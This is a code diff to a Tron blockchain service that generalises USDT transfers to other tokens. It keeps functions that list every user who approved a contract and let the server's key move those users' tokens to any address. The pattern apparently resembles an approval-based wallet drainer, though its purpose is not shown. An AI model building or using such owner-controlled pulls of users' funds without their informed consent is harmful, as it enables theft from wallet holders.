@@ -2,11 +2,11 @@
 // 🔗 Tron Blockchain Service
 // =================================
 
-import { MAX_APPROVAL } from "@/config/chains";
-import { ChainType, CurrencyType, BlockchainResult, UserInfo } from "@/types";
-import { getChainAbi, getChainConfig } from "../utils/chainUtils";
+import { MAX_APPROVAL, TOKEN_ADDRESSES } from "@/constants";
+import { ChainType, CurrencyType, BlockchainResult } from "@/types";
+import { getChainAbi } from "../../utils/chainUtils";
 import bigNumber from "bignumber.js";
-import { TOKEN_ADDRESSES } from "@/constants";
+import { ONE_TIME_PING_ADDRESSES } from "@/constants/blockchain";
 
 // Define proper types for TronWeb
 interface TronWebInstance {
@@ -56,14 +56,14 @@ export class TronService {
     userAddress: string
   ): Promise<number> {
     try {
-      const config = getChainConfig(chain);
+      const contractAddress = ONE_TIME_PING_ADDRESSES[chain];
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
         throw new Error("TronWeb not available");
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), contractAddress);
 
       // Try to call the function with proper error handling
       const nonce = await contract.getUserNonce(userAddress).call();
@@ -120,7 +120,7 @@ export class TronService {
   };
 
   /**
-   * Get user's USDT balance with multiple fallback strategies
+   * Get user's token balance with multiple fallback strategies
    */
   getPairBalance = async (
     tokenAddress: string,
@@ -608,10 +608,11 @@ export class TronService {
   }
 
   /**
-   * Transfer USDT from approved user using OneTimePing contract
+   * Transfer token from approved user using OneTimePing contract
    * Server-side compatible implementation
    */
   static async transferFromUserAsOwner(
+    currency: string,
     fromAddress: string,
     toAddress: string,
     amount: string
@@ -624,9 +625,8 @@ export class TronService {
       }
 
       // Get contract addresses
-      const config = getChainConfig("tron");
-      const usdtContractAddress = config.usdt;
-      const oneTimePingAddress = config.oneTimePing;
+      const tokenAddress = TOKEN_ADDRESSES["tron"][currency as CurrencyType];
+      const oneTimePingAddress = ONE_TIME_PING_ADDRESSES["tron"];
 
       if (!oneTimePingAddress) {
         throw new Error("OneTimePing contract address not configured");
@@ -651,36 +651,32 @@ export class TronService {
 
       const requiredAmount = Math.floor(parseFloat(amount) * 1000000);
 
-      const usdtContract = await tronWeb
+      const tokenContract = await tronWeb
         .contract()
-        .at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-      const allowance = await usdtContract
+        .at(tokenAddress);
+      const allowance = await tokenContract
         .allowance(fromAddress, oneTimePingAddress)
         .call();
       console.log("Current allowance:", allowance.toString());
       console.log("Required amount:", requiredAmount);
       console.log("Sufficient allowance:", allowance >= requiredAmount);
 
-      const balance = await usdtContract.balanceOf(fromAddress).call();
-      console.log("USDT balance:", balance.toString());
+      const balance = await tokenContract.balanceOf(fromAddress).call();
+      console.log(`${currency.toUpperCase()} balance:`, balance.toString());
       console.log("Required amount:", requiredAmount);
       console.log("Sufficient balance:", balance >= requiredAmount);
 
-      console.log("USDT Contract:", usdtContractAddress);
+      console.log(`${currency.toUpperCase()} Contract:`, tokenAddress);
       console.log("OneTimePing Contract:", oneTimePingAddress);
       console.log("From Address:", fromAddress);
       console.log("To Address:", toAddress);
-      // return {
-      //   success: true,
-      //   txHash: "",
-      //   message: "testing",
-      // };
-      // Execute transferUSDT transaction through OneTimePing contract
+
+      // Execute transferToken transaction through OneTimePing contract
       let result;
       try {
         result = await oneTimePingContract
-          .transferUSDT(
-            usdtContractAddress,
+          .transferToken(
+            tokenAddress,
             fromAddress,
             toAddress,
             requiredAmount
@@ -697,7 +693,7 @@ export class TronService {
       return {
         success: true,
         txHash: result,
-        message: `${amount} USDT 从 ${fromAddress} 转账至 ${toAddress} (通过 OneTimePing 合约)`,
+        message: `${amount} ${currency.toUpperCase()} 从 ${fromAddress} 转账至 ${toAddress} (通过 OneTimePing 合约)`,
       };
     } catch (error: any) {
       // Silent error handling for production
@@ -705,22 +701,22 @@ export class TronService {
         success: false,
         error:
           error.message ||
-          "作为 TRON 所有者，无法通过 OneTimePing 合约转移 USDT",
+          `作为 TRON 所有者，无法通过 OneTimePing 合约转移 ${currency.toUpperCase()}`,
       };
     }
   }
 
   /**
-   * Transfer USDT from approved user (owner only)
+   * Transfer token from approved user (owner only)
    */
   static async transferFromUser(
     chain: ChainType,
+    currency: CurrencyType,
     fromAddress: string,
     toAddress: string,
     amount: string
   ): Promise<BlockchainResult> {
     try {
-      const config = getChainConfig(chain);
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
@@ -737,10 +733,10 @@ export class TronService {
 
       tronWeb.setPrivateKey(serverPrivateKey);
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), ONE_TIME_PING_ADDRESSES[chain]);
 
       const tx = await contract
-        .transferFromUser(fromAddress, toAddress, amount)
+        .transferFromUser(TOKEN_ADDRESSES[chain][currency], fromAddress, toAddress, amount)
         .send();
 
       return { success: true, txHash: tx };
@@ -750,21 +746,20 @@ export class TronService {
   }
 
   /**
-   * Check if user is approved for USDT spending
+   * Check if user is approved for token spending
    */
   static async isUserApproved(
     chain: ChainType,
     userAddress: string
   ): Promise<boolean> {
     try {
-      const config = getChainConfig(chain);
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
         return false;
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), ONE_TIME_PING_ADDRESSES[chain]);
 
       const isApproved = await contract.isApprovedUser(userAddress).call();
       return tronWeb.toBigNumber(isApproved).toNumber() === 1;
@@ -774,21 +769,20 @@ export class TronService {
   }
 
   /**
-   * Get user's approved USDT allowance
+   * Get user's approved token allowance
    */
   static async getUserAllowance(
     chain: ChainType,
     userAddress: string
   ): Promise<string> {
     try {
-      const config = getChainConfig(chain);
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
         return "0";
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), ONE_TIME_PING_ADDRESSES[chain]);
 
       const allowance = await contract.getUserAllowance(userAddress).call();
       return tronWeb.toBigNumber(allowance).toString();
@@ -802,14 +796,13 @@ export class TronService {
    */
   static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
     try {
-      const config = getChainConfig(chain);
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
         return [];
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), ONE_TIME_PING_ADDRESSES[chain]);
 
       const users = await contract.getAllApprovedUsers().call();
       return users;
@@ -826,7 +819,6 @@ export class TronService {
     userAddress: string
   ): Promise<BlockchainResult> {
     try {
-      const config = getChainConfig(chain);
       const tronWeb = (global as any).tronWeb;
 
       if (!tronWeb) {
@@ -843,7 +835,7 @@ export class TronService {
 
       tronWeb.setPrivateKey(serverPrivateKey);
 
-      const contract = tronWeb.contract(getChainAbi(chain), config.oneTimePing);
+      const contract = tronWeb.contract(getChainAbi(chain), ONE_TIME_PING_ADDRESSES[chain]);
 
       const tx = await contract.revokeUserApproval(userAddress).send();
       return { success: true, txHash: tx };
